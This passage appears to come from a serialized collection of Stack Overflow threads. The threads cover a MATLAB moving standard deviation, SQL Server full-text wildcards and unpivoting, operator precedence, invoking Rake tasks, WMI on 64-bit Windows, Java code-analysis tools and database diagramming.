magnitude.\\n\\n% check for a windowmode\\nif (nargin&lt;3) || isempty(windowmode)\\n  % supply the default: \\n  windowmode = 'central';\\nelseif ~ischar(windowmode)\\n  error 'If supplied, windowmode must be a character flag.'\\nend\\n% check for a valid shortening.\\nvalid = {'central' 'forward' 'backward'};\\nwindowmode = lower(windowmode);\\nind = strmatch(windowmode,valid);\\nif isempty(ind)\\n  error 'Windowmode must be a character flag: ''c'', ''b'', or ''f''.'\\nelse\\n  windowmode = valid{ind};\\nend\\n\\n% length of the time series\\nn = length(x);\\n\\n% check for valid k\\nif (nargin&lt;2) || isempty(k) || (rem(k,1)~=0)\\n  error 'k was not provided or not an integer.'\\nend\\nswitch windowmode\\n  case 'central'\\n    if k&lt;1\\n      error 'k must be at least 1 for windowmode = ''central''.'\\n    end\\n    if n&lt;(2*k+1)\\n      error 'k is too large for this short of a series and this windowmode.'\\n    end\\n  otherwise\\n    if k&lt;2\\n      error 'k must be at least 2 for windowmode = ''forward'' or ''backward''.'\\n    end\\n    if (n&lt;k)\\n      error 'k is too large for this short of a series.'\\n    end\\nend\\n\\n% Improve the numerical analysis by subtracting off the series mean\\n% this has no effect on the standard deviation.\\nx = x - mean(x);\\n\\n% we will need the squared elements \\nx2 = x.^2;\\n\\n% split into the three windowmode cases for simplicity\\nA = 1;\\nswitch windowmode\\n  case 'central'\\n    B = ones(1,2*k+1);\\n    s = sqrt((filter(B,A,x2) - (filter(B,A,x).^2)*(1/(2*k+1)))/(2*k));\\n    s(k:(n-k)) = s((2*k):end);\\n  case 'forward'\\n    B = ones(1,k);\\n    s = sqrt((filter(B,A,x2) - (filter(B,A,x).^2)*(1/k))/(k-1));\\n    s(1:(n-k+1)) = s(k:end);\\n  case 'backward'\\n    B = ones(1,k);\\n    s = sqrt((filter(B,A,x2) - (filter(B,A,x).^2)*(1/k))/(k-1));\\nend\\n\\n% special case the ends as appropriate\\nswitch windowmode\\n  case 'central'\\n    % repairs are needed at both ends\\n    for i = 1:k\\n      s(i) = std(x(1:(k+i)));\\n      s(n-k+i) = std(x((n-2*k+i):n));\\n    end\\n  case 'forward'\\n    % the last k elements must be repaired\\n    for i = (k-1):-1:1\\n      s(n-i+1) = std(x((n-i+1):n));\\n    end\\n  case 'backward'\\n    % the first k elements must be repaired\\n    for i = 1:(k-1)\\n      s(i) = std(x(1:i));\\n    end\\nend\\nend\\n\\n\\nThe necessary parameters are:\\n\\n\\nLAG: lag for the moving mean and moving st. dev.\\nDIFF: number of st. dev. away from the mean to generate a signal\\nINFLUENCE: when there is a signal, how much is mean/st.dev. influenced? (number between 0-1)\\nDIRECTION: signal when deviation is 'up'/'down'/'both' away from the mean?\\n\\n\\nAs you can see, I used the settings LAG=10; DIFF=3.5; INFLUENCE=0; for this demo. Feel free to fiddle around with these parameters and study the differences in performance of the algorithm. \\n\"], ['Note: I am using SQL\\'s Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\\n\\nI\\'ve read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I\\'m considering using a CLR function to add regex matching, but I\\'m curious to see what other solutions people might have.\\n\\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\\n\\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, \\'\"*searchterm\"\\');\\n\\n\\nThus, my need for a workaround.  I\\'m only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn\\'t fail.\\n', \"The wildcard character in SQL Server is the % sign and it works just fine, leading, trailing or otherwise.\\n\\nThat said, if you're going to be doing any kind of serious full text searching then I'd consider utilising the Full Text Index capabilities. Using % and _ wild cards will cause your database to take a serious performance hit.\\n\", \"% Matches any number of characters_ Matches a single character\\r\\n\\r\\nI've never used Full-Text indexing but you can accomplish rather complex and fast search queries with simply using the build in T-SQL string functions.\", 'One thing worth keeping in mind is that leading wildcard queries come at a significant performance premium, compared to other wildcard usages.', \"The problem with leading Wildcards: They cannot be indexed, hence you're doing a full table scan.\", \"Using the '%' character I've searched our database using something like the following:\\r\\n\\r\\nSELECT name FROM TblNames WHERE name LIKE '%overflow'\\r\\n\\r\\n\\r\\nUsing this form or query can be slow at times but we only use it for the occasional manual search.\", 'From SQL Server Books Online:\\r\\n\\r\\nTo write full-text queries in Microsoft SQL Server 2005, you must learn how to use the CONTAINS and FREETEXT Transact-SQL predicates, and the CONTAINSTABLE and FREETEXTTABLE rowset-valued functions.\\r\\nThat means all of the queries written above with the % and _ are not valid full text queries.\\r\\nHere is a sample of what a query looks like when calling the CONTAINSTABLE function.\\r\\n\\r\\nSELECT RANK , * FROM TableName , CONTAINSTABLE (TableName, , \\' \"WildCard\" \\') searchTable WHERE [KEY] = TableName.pk ORDER BY searchTable.RANK DESC\\r\\nIn order for the CONTAINSTABLE function to know that I\\'m using a wildcard search, I have to wrap it in double quotes. I can use the wildcard character * at the beginning or ending. There are a lot of other things you can do when you\\'re building the search string for the CONTAINSTABLE function. You can search for a word near another word, search for inflectional words (drive = drives, drove, driving, and driven), and search for synonym of another word (metal can have synonyms such as aluminum and steel).\\r\\nI just created a table, put a full text index on the table and did a couple of test searches and didn\\'t have a problem, so wildcard searching works as intended.\\r\\n[Update]\\r\\nI see that you\\'ve updated your question and know that you need to use one of the functions.\\r\\nYou can still search with the wildcard at the beginning, but if the word is not a full word following the wildcard, you have to add another wildcard at the end.Example:  \"*ildcar\" will look for a single word as long as it ends with \"ildcar\".Example:  \"*ildcar*\" will look for a single word with \"ildcar\" in the middle, which means it will match \"wildcard\".  [Just noticed that Markdown removed the wildcard characters from the beginning and ending of my quoted string here.]\\r\\n[Update #2]\\r\\nDave Ward - Using a wildcard with one of the functions shouldn\\'t be a huge perf hit. If I created a search string with just \"*\", it will not return all rows, in my test case, it returned 0 records.', \"When it comes to full-text searching, for my money nothing beats Lucene.  There is a .Net port available that is compatible with indexes created with the Java version.\\r\\n\\r\\nThere's a little work involved in that you have to create/maintain the indexes, but the search speed is fantastic and you can create all sorts of interesting queries.  Even indexing speed is pretty good - we just completely rebuild our indexes once a day and don't worry about updating them.\\r\\n\\r\\nAs an example, this search functionality is powered by Lucene.Net.\", \"Just FYI, Google does not do any substring searches or truncation, right or left.  They have a wildcard character * to find unknown words in a phrase, but not a word.   \\n\\nGoogle, along with most full-text search engines, sets up an inverted index based on the alphabetical order of words, with links to their source documents.  Binary search is wicked fast, even for huge indexes.  But it's really really hard to do a left-truncation in this case, because it loses the advantage of the index.  \\n\", 'Workaround only for leading wildcard:\\n\\n\\nstore the text reversed in a different field (or in materialised view)\\ncreate a full text index on this column\\nfind the reversed text with an *\\n\\nSELECT * \\nFROM TABLENAME \\nWHERE CONTAINS(TextColumnREV, \\'\"mrethcraes*\"\\');\\n\\n\\n\\nOf course there are many drawbacks, just for quick workaround...\\n\\nNot to mention CONTAINSTABLE...\\n', 'It is possible to use the wildcard \"*\" at the end of the word or phrase (prefix search).\\n\\nFor example, this query will find all \"datab\", \"database\", \"databases\" ...\\n\\nSELECT * FROM SomeTable WHERE CONTAINS(ColumnName, \\'\"datab*\"\\')\\n\\n\\nBut, unforutnately, it is not possible to search with leading wildcard.\\n\\nFor example, this query will not find \"database\"\\n\\nSELECT * FROM SomeTable WHERE CONTAINS(ColumnName, \\'\"*abase\"\\')\\n\\n', 'To perhaps add clarity to this thread, from my testing on 2008 R2, Franjo is correct above. When dealing with full text searching, at least when using the CONTAINS phrase, you cannot use a leading , only a trailing functionally. * is the wildcard, not % in full text.\\n\\nSome have suggested that * is ignored. That does not seem to be the case, my results seem to show that the trailing * functionality does work. I think leading * are ignored by the engine.\\n\\nMy added problem however is that the same query, with a trailing *, that uses full text with wildcards worked relatively fast on 2005(20 seconds), and slowed to 12 minutes after migrating the db to 2008 R2. It seems at least one other user had similar results and he started a forum post which I added to...   FREETEXT works fast still, but something \"seems\" to have changed with the way 2008 processes trailing * in CONTAINS. They give all sorts of warnings in the Upgrade Advisor that they \"improved\" FULL TEXT so your code may break, but unfortunately they do not give you any specific warnings about certain deprecated code etc. ...just a disclaimer that they changed it, use at your own risk. \\n\\nhttp://social.msdn.microsoft.com/Forums/ar-SA/sqlsearch/thread/7e45b7e4-2061-4c89-af68-febd668f346c\\n\\nMaybe, this is the closest MS hit related to these issues... http://msdn.microsoft.com/en-us/library/ms143709.aspx\\n', 'As a parameter in a stored procedure you can use it as:\\n\\nALTER procedure [dbo].[uspLkp_DrugProductSelectAllByName]\\n(\\n    @PROPRIETARY_NAME varchar(10)\\n)\\nas\\n    set nocount on\\n    declare @PROPRIETARY_NAME2 varchar(10) = \\'\"\\' + @PROPRIETARY_NAME + \\'*\"\\'\\n\\n    select ldp.*, lkp.DRUG_PKG_ID\\n    from Lkp_DrugProduct ldp\\n    left outer join Lkp_DrugPackage lkp on ldp.DRUG_PROD_ID = lkp.DRUG_PROD_ID\\n    where contains(ldp.PROPRIETARY_NAME, @PROPRIETARY_NAME2)\\n\\n', 'Perhaps the following link will provide the final answer to this use of wildcards: Performing FTS Wildcard Searches.\\n\\nNote the passage that states: \"However, if you specify \\x80\\x9cChain\\x80\\x9d or \\x80\\x9cChain\\x80\\x9d, you will not get the expected result. The asterisk will be considered as a normal punctuation mark not a wildcard character. \"\\n'], [\"I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.\\n\\nI have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.\\n\\nTableA\\nColumn1, Column2, Column3\\n\\n\\nSQL Statement to ruturn\\n\\nResultA\\nValue of Column1\\nValue of Column2\\nValue of Column3\\n\\n\\n\\n\\n@Kevin: I've had a google search on the topic but alot of the example where overly complex for my example, are you able to help further?\\n\\n@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3\\n\", \"You should take a look at the UNPIVOT clause.\\r\\nUpdate1: GateKiller, strangely enough I read an article (about something unrelated) about it this morning and I'm trying to jog my memory where I saw it again, had some decent looking examples too. It'll come back to me I'm sure.\\r\\nUpdate2: Found it: http://weblogs.sqlteam.com/jeffs/archive/2008/04/23/unpivot.aspx\", 'UNION should be your friend:\\r\\n\\r\\nSELECT Column1 FROM table WHERE idColumn = 1UNION ALLSELECT Column2 FROM table WHERE idColumn = 1UNION ALLSELECT Column3 FROM table WHERE idColumn = 1\\r\\n\\r\\nbut it can also be your foe on large result sets.', 'If you have a fixed set of columns and you know what they are, you can basically do a series of subselects \\r\\n(SELECT Column1 AS ResultA FROM TableA) as R1 \\r\\nand join the subselects. All this in a single query.', \"I'm not sure of the SQL Server syntax for this but in MySQL I would do\\n\\nSELECT IDColumn, ( IF( Column1 &gt;= 3, 1, 0 ) + IF( Column2 &gt;= 3, 1, 0 ) + IF( Column3 &gt;= 3, 1, 0 ) + ... [snip ] )\\n  AS NumberOfColumnsGreaterThanThree\\nFROM TableA;\\n\\n\\nEDIT: A very (very) brief Google search tells me that the CASE statement does what I am doing with the IF statement in MySQL.  You may or may not get use out of the Google result I found\\n\\nFURTHER EDIT: I should also point out that this isn't an answer to your question but an alternative solution to your actual problem.\\n\", 'I had to do this for a project before. One of the major difficulties I had was explaining what I was trying to do to other people. I spent a ton of time trying to do this in SQL, but I found the pivot function woefully inadequate. I do not remember the exact reason why it was, but it is too simplistic for most applications, and it isn\\'t full implemented in MS SQL 2000. I wound up writing a pivot function in .NET. I\\'ll post it here in hopes it helps someone, someday. \\r\\n\\r\\n \\'\\'\\' &lt;summary&gt;    \\'\\'\\' Pivots a data table from rows to columns    \\'\\'\\' &lt;/summary&gt;    \\'\\'\\' &lt;param name=\"dtOriginal\"&gt;The data table to be transformed&lt;/param&gt;    \\'\\'\\' &lt;param name=\"strKeyColumn\"&gt;The name of the column that identifies each row&lt;/param&gt;    \\'\\'\\' &lt;param name=\"strNameColumn\"&gt;The name of the column with the values to be transformed from rows to columns&lt;/param&gt;    \\'\\'\\' &lt;param name=\"strValueColumn\"&gt;The name of the column with the values to pivot into the new columns&lt;/param&gt;    \\'\\'\\' &lt;returns&gt;The transformed data table&lt;/returns&gt;    \\'\\'\\' &lt;remarks&gt;&lt;/remarks&gt;    Public Shared Function PivotTable(ByVal dtOriginal As DataTable, ByVal strKeyColumn As String, ByVal strNameColumn As String, ByVal strValueColumn As String) As DataTable        Dim dtReturn As DataTable        Dim drReturn As DataRow        Dim strLastKey As String = String.Empty        Dim blnFirstRow As Boolean = True        \\' copy the original data table and remove the name and value columns        dtReturn = dtOriginal.Clone        dtReturn.Columns.Remove(strNameColumn)        dtReturn.Columns.Remove(strValueColumn)        \\' create a new row for the new data table        drReturn = dtReturn.NewRow        \\' Fill the new data table with data from the original table        For Each drOriginal As DataRow In dtOriginal.Rows            \\' Determine if a new row needs to be started            If drOriginal(strKeyColumn).ToString &lt;&gt; strLastKey Then                \\' If this is not the first row, the previous row needs to be added to the new data table                If Not blnFirstRow Then                    dtReturn.Rows.Add(drReturn)                End If                blnFirstRow = False                drReturn = dtReturn.NewRow                \\' Add all non-pivot column values to the new row                For Each dcOriginal As DataColumn In dtOriginal.Columns                    If dcOriginal.ColumnName &lt;&gt; strNameColumn AndAlso dcOriginal.ColumnName &lt;&gt; strValueColumn Then                        drReturn(dcOriginal.ColumnName.ToLower) = drOriginal(dcOriginal.ColumnName.ToLower)                    End If                Next                strLastKey = drOriginal(strKeyColumn).ToString            End If            \\' Add new columns if needed and then assign the pivot values to the proper column            If Not dtReturn.Columns.Contains(drOriginal(strNameColumn).ToString) Then                dtReturn.Columns.Add(drOriginal(strNameColumn).ToString, drOriginal(strValueColumn).GetType)            End If            drReturn(drOriginal(strNameColumn).ToString) = drOriginal(strValueColumn)        Next        \\' Add the final row to the new data table        dtReturn.Rows.Add(drReturn)        \\' Return the transformed data table        Return dtReturn    End Function', 'SELECT IDColumn, \\n       NumberOfColumnsGreaterThanThree = (CASE WHEN Column1 &gt;= 3 THEN 1 ELSE 0 END) + \\n                                         (CASE WHEN Column2 &gt;= 3 THEN 1 ELSE 0 END) + \\n                                         (Case WHEN Column3 &gt;= 3 THEN 1 ELSE 0 END) \\nFROM TableA;\\n\\n'], ['What is BODMAS and why is it useful in programming?', \"http://www.easymaths.com/What_on_earth_is_Bodmas.htm:\\n\\n\\n  What do you think the answer to 2 + 3 x 5 is?\\n  \\n  Is it (2 + 3) x 5 = 5 x 5 = 25 ?\\n  \\n  or 2 + (3 x 5) = 2 + 15 = 17 ?\\n  \\n  BODMAS can come to the rescue and give us rules to follow so that we always get the right answer:\\n  \\n  (B)rackets (O)rder (D)ivision (M)ultiplication (A)ddition (S)ubtraction\\n  \\n  According to BODMAS, multiplication should always be done before addition, therefore 17 is actually the correct answer according to BODMAS and will also be the answer which your calculator will give if you type in 2 + 3 x 5 .\\n\\n\\nWhy it is useful in programming? No idea, but i assume it's because you can get rid of some brackets? I am a quite defensive programmer, so my lines can look like this:\\n\\nresult = (((i + 4) - (a + b)) * MAGIC_NUMBER) - ANOTHER_MAGIC_NUMBER;\\n\\n\\nwith BODMAS you can make this a bit clearer:\\n\\nresult = (i + 4 - (a + b)) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;\\n\\n\\nI think i'd still use the first variant - more brackets, but that way i do not have to learn yet another rule and i run into less risk of forgetting it and causing those weird hard to debug errors?\\n\\nJust guessing at that part though.\\n\\nMike Stone EDIT: Fixed math as Gaius points out\\n\", 'Another version of this (in middle school) was \"Please Excuse My Dear Aunt Sally\".\\r\\n\\r\\n\\r\\nParentheses\\r\\nExponents\\r\\nMultiplication\\r\\nDivision\\r\\nAddition\\r\\nSubtraction\\r\\n\\r\\n\\r\\nThe mnemonic device was helpful in school, and still useful in programming today.', 'Order of operations in an expression, such as:\\n\\nfoo * (bar + baz^2 / foo)\\n\\n\\n\\nBrackets first\\nOrders (ie Powers and Square Roots, etc.)\\nDivision and Multiplication (left-to-right)\\nAddition and Subtraction (left-to-right)\\n\\n\\nsource: http://www.mathsisfun.com/operation-order-bodmas.html\\n', 'When I learned this in grade school (in Canada) it was referred to as BEDMAS:\\r\\n\\r\\nBrackets \\r\\nExponents \\r\\nDivision \\r\\nMultiplication \\r\\nAddition \\r\\nSubtraction\\r\\n\\r\\nJust for those from this part of the world...', \"I'm not really sure how applicable to programming the old BODMAS mnemonic is anyways.  There is no guarantee on order of operations between languages, and while many keep the standard operations in that order, not all do.  And then there are some languages where order of operations isn't really all that meaningful (Lisp dialects, for example).  In a way, you're probably better off for programming if you forget the standard order and either use parentheses for everything(eg (a*b) + c) or specifically learn the order for each language you work in.\", \"I don't have the power to edit @Michael Stum's answer, but it's not quite correct.  He reduces\\n\\n(i + 4) - (a + b)\\n\\n\\nto\\n\\n(i + 4 - a + b)\\n\\n\\nThey are not equivalent.  The best reduction I can get for the whole expression is\\n\\n((i + 4) - (a + b)) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;\\n\\n\\nor\\n\\n(i + 4 - a - b) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;\\n\\n\", \"I read somewhere that especially in C/C++ splitting your expressions into small statements was better for optimisation; so instead of writing hugely complex expressions in one line, you cache the parts into variables and do each one in steps, then build them up as you go along.\\n\\nThe optimisation routines will use registers in places where you had variables so it shouldn't impact space but it can help the compiler a little.\\n\"], [\"I have a Rakefile with a Rake task that I would normally call from the command line:\\n\\nrake blog:post Title\\n\\n\\nI'd like to write a Ruby script that calls that Rake task multiple times, but the only solution I see is shelling out using `` (backticks) or system.\\n\\nWhat's the right way to do this?\\n\", \"from timocracy.com:\\r\\n\\r\\nrequire 'rake'\\r\\nrequire 'rake/rdoctask'\\r\\nrequire 'rake/testtask'\\r\\nrequire 'tasks/rails'\\r\\n\\r\\ndef capture_stdout\\r\\n  s = StringIO.new\\r\\n  oldstdout = $stdout\\r\\n  $stdout = s\\r\\n  yield\\r\\n  s.string\\r\\nensure\\r\\n  $stdout = oldstdout\\r\\nend\\r\\n\\r\\nRake.application.rake_require '../../lib/tasks/metric_fetcher'\\r\\nresults = capture_stdout {Rake.application['metric_fetcher'].invoke}\\r\\n\", 'You can use invoke and reenable to execute the task a second time.\\n\\nYour example call rake blog:post Title seems to have a parameter. This parameter can be used as a parameter in invoke:\\n\\nExample:\\n\\nrequire \\'rake\\'\\ntask \\'mytask\\', :title do |tsk, args|\\n  p \"called #{tsk} (#{args[:title]})\"\\nend\\n\\n\\n\\nRake.application[\\'mytask\\'].invoke(\\'one\\')\\nRake.application[\\'mytask\\'].reenable\\nRake.application[\\'mytask\\'].invoke(\\'two\\')\\n\\n\\nPlease replace mytask with blog:post and instead the task definition you can require your rakefile.\\n\\nThis solution will write the result to stdout - but you did not mention, that you want to suppress output.\\n\\n\\n\\nInteresting experiment:\\n\\nYou can call the reenable also inside the task definition. This allows a task to reenable himself.\\n\\nExample:\\n\\nrequire \\'rake\\'\\ntask \\'mytask\\', :title do |tsk, args|\\n  p \"called #{tsk} (#{args[:title]})\"\\n  tsk.reenable  #&lt;-- HERE\\nend\\n\\nRake.application[\\'mytask\\'].invoke(\\'one\\')\\nRake.application[\\'mytask\\'].invoke(\\'two\\')\\n\\n\\nThe result (tested with rake 10.4.2):\\n\\n\"called mytask (one)\"\\n\"called mytask (two)\"\\n\\n', \"This works with Rake version 10.0.3:\\n\\nrequire 'rake'\\napp = Rake.application\\napp.init\\n# do this as many times as needed\\napp.add_import 'some/other/file.rake'\\n# this loads the Rakefile and other imports\\napp.load_rakefile\\n\\napp['sometask'].invoke\\n\\n\\nAs knut said, use reenable if you want to invoke multiple times. \\n\"], ['I\\'ve been working on a project that accesses the WMI to get information about the software installed on a user\\'s machine. We\\'ve been querying Win32_Product only to find that it doesn\\'t exist in 64-bit versions of Windows because it\\'s an \"optional component\".\\n\\nI know there are a lot of really good alternatives to querying the WMI for this information, but I\\'ve got a bit of a vested interest in finding out how well this is going to work out.\\n\\nWhat I want to know is if there\\'s some kind of redistributable that can be packaged with our software to allow 64-bit users to get the WMI Installer Provider put onto their machines? Right now, they have to install it manually and the installation requires they have their Windows disc handy.\\n\\nEdit:\\n\\n\\n  You didn\\'t mention for what OS, but the WMI Redistributable Components version 1.0 definitely exists.\\n\\n\\nFor Operation System, we\\'ve been using .NET 3.5 so we need packages that will work on XP64 and 64bit versions of Windows Vista.\\n', \"You didn't mention for what OS, but the WMI Redistributable Components version 1.0 definitely exists.\\r\\n\\r\\nFor Windows Server 2003, the WMI SDK and redistributables are part of the Server SDK\\r\\n\\r\\nI believe that the same is true for the Server 2008 SDK\", \"Wouldn't the normal approach for a Windows component be that the administrators of a set of servers use whatever their local software push technology (i.e. SMS) to ensure that component is installed? This is not that uncommon of a requirement for the remote management of servers via WMI.\\n\\nBy the way, the WMI Installer Provider is not provided in the Standard Edition of the server products, but it is in the Enterprise Edition. So, Windows 2003 Server will not have this installed by default, but Windows 2003 Server Enterprise (and DataCenter) will.\\n\\nThis answer does imply that you are putting the burden of installation back on your user base, but for Windows administrators this should not be any issue.\\n\"], [\"What code analysis tools do you use on your Java projects?\\n\\nI am interested in all kinds\\n\\n\\nstatic code analysis tools (FindBugs, PMD, and any others)\\ncode coverage tools (Cobertura, Emma, and any others)\\nany other instrumentation-based tools \\nanything else, if I'm missing something\\n\\n\\nIf applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. \\n\\nIf a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.\\n\", \"We use FindBugs and JDepend integrated with Ant. We use JUnit but we're not using any coverage tool. \\r\\n\\r\\nI'm not using it integrated to Rational Application Developer (the IDE I'm using to develop J2EE applications) because I like how neat it looks when you run javac in the Windows console. :P\", \"Checkstyle is another one I've used at a previous company... it's mainly for style checking, but it can do some static analysis too.  Also, Clover for code coverage, though be aware it is not a free tool.\", \"We are using FindBugs and Checkstyle as well as Clover for Code Coverage. \\r\\n\\r\\nI think it's important to have some kind of static analysis, supporting your development. Unfortunately it's still not widely spread that these tools are important.\", 'I am looking for many answers to learn about new tools and consolidate this knowledge in a one question/thread, so I doubt there will be 1 true answer to this question.\\r\\n\\r\\nMy answer to my own question is that we use:\\r\\n\\r\\n\\r\\nFindbugs to look for common errors bad/coding - run from maven, and also integrates easily into Eclipse\\r\\nCobertura for our coverage reports - run from maven\\r\\n\\r\\n\\r\\nHudson also has a task-scanner plugin that will display a count of your TODO and FIXMEs, as well as show where they are in the source files.\\r\\n\\r\\nAll are integrated with Maven 1.x in our case and tied into Hudson, which runs our builds on check-in as well as extra things nightly and weekly. Hudson trend graphs our JUnit tests, coverage, findbugs, as well as open tasks. There is also a Hudson plugin that reports and graphs our compile warnings. We also have several performance tests with their own graphs of performance and memory use over time using the Hudson plots plugin as well.', \"All of the following we use and integrate easiy in both our Maven 2.x builds and Eclipse/RAD 7:\\n\\n\\nTesting - JUnit/TestNG\\nCode analysis - FindBugs, PMD\\nCode coverage - Clover\\n\\n\\nIn addition, in our Maven builds we have:\\n\\n\\nJDepend\\nTag checker (TODO, FIXME, etc)\\n\\n\\nFurthermore, if you're using Maven 2.x, CodeHaus has a collection of handy Maven plugins in their Mojo project.\\n\\nNote: Clover has out-of-the-box integration with the Bamboo CI server (since they're both Atlassian products). There are also Bamboo plugins for FindBugs, PMD, and CheckStyle but, as noted, the free Hudson CI server has those too.\\n\", 'For static analysis tools I often use CPD, PMD, FindBugs, and Checkstyle.\\n\\nCPD is the PMD \"Copy/Paste Detector\" tool. I was using PMD for a little while before I noticed the \"Finding Duplicated Code\" link on the PMD web page.\\n\\nI\\'d like to point out that these tools can sometimes be extended beyond their \"out-of-the-box\" set of rules. And not just because they\\'re open source so that you can rewrite them. Some of these tools come with applications or \"hooks\" that allow them to be extended. For example, PMD comes with the \"designer\" tool that allows you to create new rules. Also, Checkstyle has the DescendantToken check that has properties that allow for substantial customization.\\n\\nI integrate these tools with an Ant-based build. You can follow the link to see my commented configuration.\\n\\nIn addition to the simple integration into the build, I find it helpful to configure the tools to be somewhat \"integrated\" in a couple of other ways. Namely, report generation and warning suppression uniformity. I\\'d like to add these aspects to this discussion (which should probably have the \"static-analysis\" tag also): how are folks configuring these tools to create a \"unified\" solution? (I\\'ve asked this question separately here)\\n\\nFirst, for warning reports, I transform the output so that each warning has the simple format:\\n\\n/absolute-path/filename:line-number:column-number: warning(tool-name): message\\n\\nThis is often called the \"Emacs format,\" but even if you aren\\'t using Emacs, it\\'s a reasonable format for homogenizing reports. For example:\\n\\n/project/src/com/example/Foo.java:425:9: warning(Checkstyle):Missing a Javadoc comment.\\n\\nMy warning format transformations are done by my Ant script with Ant filterchains.\\n\\nThe second \"integration\" that I do is for warning suppression. By default, each tool supports comments or an annotation (or both) that you can place in your code to silence a warning that you want to ignore. But these various warning suppression requests do not have a consistent look which seems somewhat silly. When you\\'re suppressing a warning, you\\'re suppressing a warning, so why not always write \"SuppressWarning?\"\\n\\nFor example, PMD\\'s default configuration suppresses warning generation on lines of code with the string \"NOPMD\" in a comment. Also, PMD supports Java\\'s @SuppressWarnings annotation. I configure PMD to use comments containing \"SuppressWarning(PMD.\" instead of NOPMD so that PMD suppressions look alike. I fill in the particular rule that is violated when using the comment style suppression:\\n\\n// SuppressWarnings(PMD.PreserveStackTrace) justification: (false positive) exceptions are chained\\n\\nOnly the \"SuppressWarnings(PMD.\" part is significant for a comment, but it is consistent with PMD\\'s support for the @SuppressWarning annotation which does recognize individual rule violations by name:\\n\\n@SuppressWarnings(\"PMD.CompareObjectsWithEquals\") // justification: identity comparision intended\\n\\nSimilarly, Checkstyle suppresses warning generation between pairs of comments (no annotation support is provided). By default, comments to turn Checkstyle off and on contain the strings CHECKSTYLE:OFF and CHECKSTYLE:ON, respectively. Changing this configuration (with Checkstyle\\'s \"SuppressionCommentFilter\") to use the strings \"BEGIN&nbsp;SuppressWarnings(CheckStyle.\" and \"END&nbsp;SuppressWarnings(CheckStyle.\" makes the controls look more like PMD:\\n\\n\\n// BEGIN SuppressWarnings(Checkstyle.HiddenField) justification: \"Effective Java,\" 2nd ed., Bloch, Item 2\\n// END SuppressWarnings(Checkstyle.HiddenField)\\n\\n\\nWith Checkstyle comments, the particular check violation (HiddenField) is significant because each check has its own \"BEGIN/END\" comment pair.\\n\\nFindBugs also supports warning generation suppression with a @SuppressWarnings annotation, so no further configuration is required to achieve some level of uniformity with other tools. Unfortunately, Findbugs has to support a custom @SuppressWarnings annotation because the built-in Java @SuppressWarnings annotation has a SOURCE retention policy which is not strong enough to retain the annotation in the class file where FindBugs needs it. I fully qualify FindBugs warnings suppressions to avoid clashing with Java\\'s @SuppressWarnings annotation:\\n\\n@edu.umd.cs.findbugs.annotations.SuppressWarnings(\"UWF&#95;FIELD&#95;NOT&#95;INITIALIZED&#95;IN&#95;CONSTRUCTOR\")\\n\\nThese techniques makes things look reasonably consistent across tools. Note that having each warning suppression contain the string \"SuppressWarnings\" makes it easy to run a simple search to find all instances for all tools over an entire code base.\\n', \"I've had good luck with Cobertura.  It's a code coverage tool which can be executed via your ant script as part of your normal build and can be integrated into Hudson.\\n\", 'I use the static analysis built into IntelliJ IDEA. Perfect integration.\\n\\nI use the code coverage built into Intellij IDEA (based on EMMA). Again, perfect integration.\\n\\nThis integrated solution is reliable, powerful, and easy-to-use compared to piecing together tools from various vendors.\\n', \"Our team use PMD and Cobertura, actually our projects are maven projects and there is very simple to include plug ins for code analysis. The real question would be for specific project which analysis you need to use, my opinion is that it's you couldn't use the same plugins for each project.\\n\", 'I use a combination of Cobertura, Checkstyle, (Ecl)Emma and Findbugs.\\n\\nEclEmma is an awesome Eclipse plugin that shows the code coverage by coloring the java source in the editor (screenshot) - the coverage is generated by running a JUnit test. This is really useful when you are trying to figure out which lines are covered in a particular class, or if you want to see just which lines are covered by a single test. This is much more user friendly and useful than generating a report and then looking through the report to see which classes have low coverage.\\n\\nThe Checkstyle and Findbugs Eclipse plugins are also useful, they generate warnings in the editor as you type.\\n\\nMaven2 has report plugins that work with the above tools to generate reports at build time. We use this to get overall project reports, which are more useful when you want aggregate numbers. These are generated by our CI builds, which run using Continuum.\\n', 'in our project we use Sonar in front of checkstyle, pmd.... together with the CI (Bamboo, Hudson) we get also a nice history of our source quality and what directing we go. I do like Sonar, because you one central tool in the CI Stack that does it for you, and you can easy customize the rules for each project.\\n', 'Structure 101 is good at code analysis and finding the cyclic package dependencies.\\n'], [\"I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. \\n\\nAnyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.\\n\\nWhat's the best program you've used for such problems?\\n\", \"If you are talking about MS SQL Server tables, I like the diagram support in SQL Server Management Studio. You just drag the tables from the explorer onto the canvas, and they are laid out for you along with lines for relationships. You'll have to do some adjusting by hand for the best looking diagrams, but it is a decent way to get diagrams.\", \"I am a big fan of Embarcadero's ER/Studio.  It is very powerful and produces excellent on-screen as well as printed results.  They have a free trial as well, so you should be able to get in and give it a shot without too much strife.\\n\\nGood luck!\\n\", 'Toad Data Modeller from Quest does a nice job on this and is reasonably priced.  Embarcadero E/R studio is good too, as Bruce mentioned.', \"OP asked about diagramming views and view dependencies, SQL Management Studio and Enterprise Manager doesn't allow you to diagram views. I can't vouch for the other tools.\\r\\nThe LINQ to SQL designer for Visual Studio does allow you to drop views on the design surface but there isn't a easy way to model the dependencies between the views. I'm not sure which tool has this type of diagramming functionality. You could take a look at Red Gate's SQLDoc tool but it just provides text based output.\", \"I upmodded Mark's post about Toad Data Modeler and wanted to point out that they have a beta version that is 